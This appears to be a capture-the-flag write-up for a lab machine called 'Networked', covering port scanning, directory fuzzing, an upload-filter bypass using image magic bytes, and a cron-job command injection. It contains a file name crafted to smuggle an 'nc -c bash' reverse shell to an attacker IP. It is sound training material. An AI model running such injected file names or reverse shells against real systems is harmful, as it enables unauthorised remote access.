# Networked

## NMAP

```Console

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16

```

## Web

* Dirsearch fuzz results

```text
[12:03:00] 301 -  235B  - /backup  ->  http://10.129.61.53/backup/          
[12:03:00] 200 -  885B  - /backup/
[12:03:03] 403 -  210B  - /cgi-bin/
[12:03:34] 200 -    1KB - /photos.php
[12:03:53] 200 -  169B  - /upload.php
[12:03:54] 301 -  236B  - /uploads  ->  http://10.129.61.53/uploads/        
[12:03:54] 200 -    2B  - /uploads/  
```

* backup tar gives out
	* lib.php
	* index.php
	* gallery.php
	* upload.php
* where upload.php contains

```php
list ($foo,$ext) = getnameUpload($myFile["name"]);
$validext = array('.jpg', '.png', '.gif', '.jpeg');
$valid = false;
foreach ($validext as $vext) {
if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
$valid = true;
}
}
```

### magic bytes

* by renaming our php shell to php.png and appending the magic bytes via `hexeditor` , we can bypass the mandated file upload restrictions according to the upload.php mentioned above

## User

* there's a cronjob running attack_check.php every 3 mins

```php

<?php       
require '/var/www/html/lib.php';   
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";
                                                                        
$files = array();                                                       
$files = preg_grep('/^([^.])/', scandir($path));                        
                                                                        
foreach ($files as $key => $value) {                                    
        $msg='';                                                        
  if ($value == 'index.html') {                                         
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}
?>

```

* append the following over `/var/www/html/uploads`

```bash
touch '; nc -c bash 10.10.14.95 9001 &'
```

# System User

	* sudo -l gives  `/usr/local/sbin/changename.sh`
* which contains

```bash
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```